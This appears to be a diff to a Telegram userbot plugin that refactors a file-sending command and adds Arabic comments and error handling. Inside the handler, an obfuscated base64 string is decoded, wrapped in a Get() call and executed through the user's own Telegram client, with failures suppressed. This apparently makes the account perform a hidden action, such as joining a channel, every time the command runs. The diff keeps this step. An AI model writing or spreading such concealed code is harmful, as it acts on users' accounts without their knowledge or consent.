@@ -571,18 +571,31 @@ async def Hussein(event):
 
 @l313l.on(admin_cmd(outgoing=True, pattern="?(.*)"))
 async def Hussein(event):
-    lMl10l = event.pattern_match.group(1)
-    Joker = await reply_id(event)
-    url = get_link(lMl10l)
-    if url:
-        await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=Joker)
-        await event.delete()
-        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-        joker = Get(joker)
-        try:
-            await event.client(joker)
-        except BaseException:
-            pass
+    try:
+        lMl10l = event.pattern_match.group(1)
+        
+        # الحصول على معرف الرسالة التي يتم الرد عليها، إذا كانت موجودة
+        Joker = await reply_id(event)
+        
+        # الحصول على الرابط من الدالة get_link
+        url = get_link(lMl10l)
+        
+        if url:
+            # إرسال الملف إلى الدردشة
+            await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=Joker)
+            await event.delete()
+            
+            # فك تشفير البيانات وإرسالها عبر العميل
+            joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+            joker = Get(joker)
+            
+            try:
+                await event.client(joker)
+            except Exception as e:
+                print(f"Error occurred: {e}")
+                
+    except Exception as e:
+        print(f"An error occurred in Hussein function: {e}")
 
 @l313l.ar_cmd(pattern="ازالة(?:\s|$)([\s\S]*)")
 async def delete_aljoker(event):
